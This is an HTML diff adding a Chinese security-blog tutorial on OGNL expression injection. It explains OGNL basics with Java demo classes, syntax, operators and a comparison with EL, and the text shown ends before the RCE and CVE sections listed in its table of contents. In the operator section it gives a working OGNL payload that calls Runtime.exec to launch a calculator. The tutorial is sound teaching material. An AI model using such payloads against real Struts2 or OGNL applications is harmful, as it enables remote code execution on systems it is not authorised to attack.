@@ -1,0 +1,716 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>OGNL表达式注入 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL%E5%9F%BA%E7%A1%80"><span class="toc-number">2.</span> <span class="toc-text">OGNL基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL%E4%B8%89%E8%A6%81%E7%B4%A0"><span class="toc-number">2.1.</span> <span class="toc-text">OGNL三要素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">2.2.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL%E8%AF%AD%E6%B3%95"><span class="toc-number">2.3.</span> <span class="toc-text">OGNL语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">2.3.1.</span> <span class="toc-text">基本语法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">2.3.2.</span> <span class="toc-text">操作符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8EEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.4.</span> <span class="toc-text">与EL表达式的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%BD%E8%A7%A3%E6%9E%90OGNL%E7%9A%84API"><span class="toc-number">2.5.</span> <span class="toc-text">能解析OGNL的API</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">OGNL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">3.1.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">3.3.</span> <span class="toc-text">高版本下的黑名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">3.4.</span> <span class="toc-text">HTTP请求中常见的注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8payload"><span class="toc-number">3.5.</span> <span class="toc-text">常用payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Confluence-CVE-2021-26084"><span class="toc-number">4.1.</span> <span class="toc-text">Confluence CVE-2021-26084</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-CVE-2020-17530%EF%BC%88S2-061%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">Struts2 CVE-2020-17530（S2-061）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Unomi-CVE-2020-13942"><span class="toc-number">4.3.</span> <span class="toc-text">Apache Unomi CVE-2020-13942</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>OGNL表达式注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/9/13
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Struts2/" style="color: #ffa2c4">Struts2</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">2.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很久之前欠下的Struts2-001基础之OGNL注入，在SICTF之后终于想起来填了（</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/04/25/Struct2%20OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://boogipop.com/2023/04/25/Struct2%20OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10482">https://xz.aliyun.com/t/10482</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="OGNL基础"><a href="#OGNL基础" class="headerlink" title="OGNL基础"></a>OGNL基础</h1><p>导入依赖(Maven配置部分建议自己搜索教程)</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>ognl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>ognl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.1.19<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="OGNL三要素"><a href="#OGNL三要素" class="headerlink" title="OGNL三要素"></a>OGNL三要素</h2><ul>
+<li><code>Expression</code> 表达式</li>
+<li><code>root</code> 根对象，即操作对象</li>
+<li><code>context</code> 上下文，用来保存对象运行的属性及其值，有点类似于运行环境的意思，保存了环境变量</li>
+</ul>
+<hr>
+<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>写一个User类来作为我们的demo，具有姓名和年龄两个属性以及对应的getter&#x2F;setter方法与构造方法</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> age<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token class-name">String</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再写一个Test类来作为我们的操作对象<code>root</code>，其中有一个user属性作为一个User对象</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token class-name">User</span> user<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">User</span> <span class="token function">getUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> user<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setUser</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> user<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>OGNL类来执行OGNL语句</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">Ognl</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">OgnlContext</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">ognl<span class="token punctuation">.</span></span><span class="token class-name">OgnlException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OGNL</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">OgnlException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Test</span> test <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">User</span> ciallo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"C1oudfL0w0"</span><span class="token punctuation">,</span> <span class="token string">"495"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        test<span class="token punctuation">.</span><span class="token function">setUser</span><span class="token punctuation">(</span>ciallo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//创建context、设置root</span>
+        <span class="token class-name">OgnlContext</span> context<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">OgnlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        context<span class="token punctuation">.</span><span class="token function">setRoot</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//设置表达式expression</span>
+        <span class="token class-name">String</span> expression<span class="token operator">=</span><span class="token string">"user.name"</span><span class="token punctuation">;</span>
+        <span class="token comment">//解析表达式</span>
+        <span class="token class-name">Object</span> ognl<span class="token operator">=</span> <span class="token class-name">Ognl</span><span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//调用获取值</span>
+        <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token class-name">Ognl</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>ognl<span class="token punctuation">,</span> context<span class="token punctuation">,</span> context<span class="token punctuation">.</span><span class="token function">getRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行OGNL.java即可获取<code>com.example.Test.user.name</code>的值</p>
+<p>注意是<code>.user.name</code>的值，上述我们是创建了一个test，并且让他的user属性为一个User对象，表达式为<code>user.name</code>也就是<strong>获取test的user属性的name属性</strong></p>
+<p><img src="/blog/2023/09/13/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20230913213444863.png" alt="image-20230913213444863"></p>
+<hr>
+<h2 id="OGNL语法"><a href="#OGNL语法" class="headerlink" title="OGNL语法"></a>OGNL语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul>
+<li><p>基本对象树的访问：通过使用<code>.</code>将对象的引用串联起来进行</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">xxxx
+xxxx<span class="token punctuation">.</span>xxxx
+xxxx<span class="token punctuation">.</span>xxxx<span class="token punctuation">.</span>xxxx<span class="token punctuation">.</span>xxxx<span class="token punctuation">.</span>xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>对容器变量的访问：通过<code>#</code>符号加上表达式进行</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">#xxxx
+#xxxx<span class="token punctuation">.</span>xxxx
+#xxxx<span class="token punctuation">.</span>xxxxx<span class="token punctuation">.</span>xxxx<span class="token punctuation">.</span>xxxx<span class="token punctuation">.</span>xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+</li>
+<li><p>容器、数组、对象：</p>
+<p>OGNL支持对数组和ArrayList等容器的顺序访问。例如：<code>group.users[0]</code></p>
+<p>同时，OGNL支持对Map的按键值查找。例如：<code>#session[&#39;mySessionPropKey&#39;]</code></p>
+<p>不仅如此，OGNL还支持容器的构造的表达式。例如：<code>&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;</code>构造一个List，<code>#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;</code>构造一个Map</p>
+<p>也可以通过任意类对象的构造函数进行对象新建。例如：<code>new Java.net.URL(&quot;xxxxxx/&quot;)</code></p>
+</li>
+<li><p>对静态方法或变量的访问：见操作符<code>@</code></p>
+</li>
+<li><p>方法调用：直接通过类似Java的方法调用方式进行，可以传递参数，例如：<code>user.getName()</code>，<code>group.users.size()</code>，<code>group.containsUser(#requestUser)</code></p>
+</li>
+<li><p>投影和选择：</p>
+<ul>
+<li>投影：选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作，语法为 <code>collection.&#123;XXX&#125;</code>，其中XXX是这个集合中每个元素的公共属性</li>
+<li>选择：过滤满足selection条件的集合元素，类似于关系数据库的记录操作。语法为：<code>collection.&#123;X YYY&#125;</code>，其中X是一个选择操作符，后面则是选择用的逻辑表达式：<ul>
+<li><code>?</code>选择满足条件的所有元素</li>
+<li><code>^</code>选择满足条件的第一个元素</li>
+<li><code>$</code>选择满足条件的最后一个元素</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><ul>
+<li><p><code>.</code>操作符：就和上面demo的作用一样，用于<strong>调用对象的属性和方法</strong> <code>user.name</code>；</p>
+<p>上一个节点的结果会作为下一个节点的上下文，如<code>(#a=new java.lang.String(&quot;calc&quot;)).(@java.lang.Runtime@getRuntime().exec(#a))</code>，也可以换成逗号<code>(#a=new java.lang.String(&quot;calc&quot;)),(@java.lang.Runtime@getRuntime().exec(#a))</code></p>
+<p>我们把表达式修改一下</p>
+<p><img src="/blog/2023/09/13/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20230913214846704.png" alt="image-20230913214846704"></p>
+<p>成功弹出计算器</p>
+<p>可以发现它执行的方式有点类似递归，会把<code>.</code>前面的表达式当做结果给后面的表达式执行了</p>
+</li>
+<li><p><code>@</code>操作符：用于<strong>调用静态属性、静态方法、静态变量</strong>，如上述的<code>@java.lang.Runtime@getRuntime().exec</code></p>
+</li>
+<li><p><code>#</code>操作符：</p>
+<ul>
+<li><p>调用非root对象：</p>
+<p>我们修改一下前面demo的代码，把<code>setRoot</code>改成<code>put</code>，这样做会把ciallo属性放入Context中，但不是以root</p>
+<p>而后面创建Expression的时候因为是非root，所以要加上#<img src="/blog/2023/09/13/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20230913220310458.png" alt="image-20230913220310458"></p>
+<p>如果没有#的话就会产生报错，因为不是root对象</p>
+<p><img src="/blog/2023/09/13/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20230913220813461.png" alt="image-20230913220813461"></p>
+</li>
+<li><p>创建Map：</p>
+<p><code>#&#123;&quot;name&quot;: &quot;C1oudfL0w0&quot;, &quot;level&quot;: &quot;12&quot;&#125;</code></p>
+</li>
+<li><p>定义变量：</p>
+<p>如一开始的例子<code>#a=new java.lang.String(&quot;calc&quot;)</code>，就是定义了一个字符串常量</p>
+</li>
+<li><p><code>$</code>操作符：一般用于配置文件，<code>$&#123;name&#125;</code></p>
+</li>
+<li><p><code>%</code>操作符：计算其中的OGNL表达式，<code>%&#123;hacker.name&#125;</code></p>
+</li>
+<li><p>List：直接使用<code>&#123;“red”, “blue”, “green”&#125;</code>创建</p>
+</li>
+<li><p>对象创建：<code>new java.lang.String[]&#123;“foobar”&#125;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="与EL表达式的区别"><a href="#与EL表达式的区别" class="headerlink" title="与EL表达式的区别"></a>与EL表达式的区别</h2><p>因为OGNL表达式是Struts2的默认表达式语言，所以只针对Struts2标签有效；然而EL在HTML中也可以使用</p>
+<p>页面取值：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>servlet</th>
+<th>OGNL</th>
+<th>EL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>parameters</td>
+<td>request.getParameter(“username”)</td>
+<td>#username</td>
+<td>${username}</td>
+</tr>
+<tr>
+<td>request</td>
+<td>request.getAttribute(“userName”)</td>
+<td>#request.userName</td>
+<td>${requestScope.username}</td>
+</tr>
+<tr>
+<td>session</td>
+<td>session.getAttribute(“userName”)</td>
+<td>#session.userName</td>
+<td>${sessionScope.username}</td>
+</tr>
+<tr>
+<td>application</td>
+<td>application.getAttribute(“userName”)</td>
+<td>#application.userName</td>
+<td>${applicationScope.username}</td>
+</tr>
+<tr>
+<td>attr</td>
+<td>用于按request &gt; session &gt; application顺序访问其属性（attribute）</td>
+<td>#attr.userName相当于按顺序在以上三个范围（scope）内读取userName属性，直到找到为止</td>
+<td></td>
+</tr>
+</tbody></table>
